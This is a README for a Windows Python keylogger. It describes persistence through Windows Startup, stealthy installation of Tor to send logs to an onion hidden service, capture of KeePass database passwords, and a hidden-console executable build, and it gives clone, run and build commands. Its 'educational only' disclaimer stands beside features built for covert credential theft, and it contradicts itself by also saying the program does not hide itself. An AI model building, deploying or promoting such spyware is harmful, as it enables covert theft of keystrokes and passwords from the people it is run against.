## Advanced Python Keylogger for Windows

NOTE: This project should be used for authorized testing or educational purposes only. 
You are free to copy, modify and reuse the source code at your own risk. 

### Uses
Some uses of a keylogger are:
- Security Testing: improving the protection against hidden key loggers;
- Business Administration: Monitor what employees are doing (with their consent);
- School/Institutions: Track keystrokes and log banned words in a file;
- Personal Control and File Backup: Make sure no one is using your computer when you are away;
- Parental Control: Track what your children are doing;
- Self-analysis and assessment.

### Features
- Global event hook on all (incl. On-Screen) keyboards using cross-platform library [Keyboard](https://github.com/boppreh/keyboard). The program makes no attempt to hide itself.
- Pure Python, no C modules to be compiled.
- 2 logging modes:
  - Storing logs locally and once a day sending logs to your onion hidden service (via Tor, of course, stealthily installing it);
  - Debug mode (printing to console).
- Persistence:
  - Adding to Windows Startup.
- Human-readable logs:
  - Logging keys as they actually are in your layout; cyrillic keyboard layout is fully implemented;
  - Logging window titles and current time where appropriate;
  - Backspace support (until the active window is changed);
  - Full upper-/ lowercase detection (capslock + shift keys).
- Privacy protection:
  - RSA public-key encryption of logs on the fly using [PyCryptoDome](https://pycryptodome.readthedocs.io/en/latest/).

### Getting started

#### System requirements
- MS Windows (tested on 10). TODO: test Linux (requires sudo) and macOS support;
- [Python 3](https://www.python.org/downloads/) (tested on v. 3.7.4).

#### Usage

##### **Quick start**
1. `git clone https://github.com/secureyourself7/python-keylogger`
2. `cd python-keylogger`
3. Customize parameters in Start.py: url_server_upload, hidden_service_check_connection.
###### **Run as a Python script**
3. `pip install requirements.txt` (alternatively `python -m pip ...`)
4. `python Start.py`
###### **Run as an executable (7 MB)**
3. `pip install pyinstaller`
4. `pyinstaller --onefile --noconsole --icon=icon.ico Start.py`
5. `dist\Start.exe`
###### **To use RSA log encryption/decryption (optional)**
1. Generate RSA key pair (optional): `python rsa_key_generator.py`.
1. Change the public key filename / paste the key in Start.py.
1. To decrypt logs type `python log_decryptor.py`, and then follow the instructions given by the script.

##### System arguments
`Start.py mode [encrypt]`
- **modes**:
  - **local:** store the logs in a local txt file. Filename is a MD5 hash of the current date (YYYY-Mon-DD).
  - **debug:** write to the console.
- **[optional]**
  - **encrypt:** enable the encryption of logs with a public key provided in Start.py.

### Video tutorials (similar but simpler projects)
https://www.youtube.com/watch?v=uODkiVbuR-g
https://www.youtube.com/watch?v=8BiOPBsXh0g

### Known issues
- Does not capture passwords auto-typed by KeePass, however, it captures KeePass DB passwords.
- See [Keyboard: Known limitations](https://github.com/boppreh/keyboard#known-limitations). 
Feel free to contribute to fix any problems, or to submit an issue!


### Notes
Cyrillic layout is implemented, meaning support for these languages: Russian, Russian - Moldava, Azeri, Belarusian, Kazakh, Kyrgyz, Mongolian, Tajik, Tatar, Serbian, Ukrainian, Uzbek. 

Please note that this repo is for educational purposes only. No contributors, major or minor, are responsible for any actions made by the software.

Don't really understand licenses or tl;dr? Check out the [MIT license summary](https://tldrlegal.com/license/mit-license).

Distributed under the MIT license. See [LICENSE](https://github.com/secureyourself7/python-keylogger/blob/master/LICENSE) for more information.
